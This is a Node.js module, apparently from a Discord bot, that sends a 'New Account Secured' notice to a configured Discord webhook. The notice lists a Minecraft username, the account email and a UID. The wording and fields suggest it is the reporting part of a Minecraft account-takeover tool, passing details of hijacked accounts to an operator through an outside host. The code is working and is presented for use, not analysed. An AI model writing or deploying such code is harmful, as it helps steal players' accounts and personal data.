const { EmbedBuilder, AttachmentBuilder, WebhookClient } = require('discord.js');
const config = require('../../../../config.json');
const path = require('path');
const fs = require('fs');
const https = require('https');
const crypto = require('crypto');

async function sendAccountWebhook(acc, uid) {
    try {
        if (!config.notifierWebhook || config.notifierWebhook === "NOTIFIER_WEBHOOK_URL" || !config.notifierWebhook.includes('discord.com/api/webhooks')) {
            console.log('[IMAGE] No valid webhook configured, skipping');
            return;
        }

        const webhookClient = new WebhookClient({ url: config.notifierWebhook });
        
        const embed = new EmbedBuilder()
            .setTitle(`New Account Secured`)
            .setColor(0x00ff00)
            .addFields(
                { name: 'Username', value: acc.newName || 'No Minecraft', inline: true },
                { name: 'Email', value: acc.email ? `||${acc.email}||` : 'Unknown', inline: true },
                { name: 'UID', value: uid || 'Unknown', inline: true }
            )
            .setTimestamp();

        if (acc.newName && acc.newName !== "No Minecraft!") {
            try {
                const encodedName = encodeURIComponent(acc.newName);
                const skinUrl = `https://visage.surgeplay.com/bust/${encodedName}.png?y=-40`;
                embed.setThumbnail(skinUrl);
            } catch (e) {
                console.log('[IMAGE] Failed to set thumbnail');
            }
        }

        await webhookClient.send({
            embeds: [embed]
        });

        console.log('[IMAGE] Successfully sent account webhook');
    } catch (error) {
        console.error('[IMAGE] Error sending webhook:', error.message);
    }
}

module.exports = sendAccountWebhook;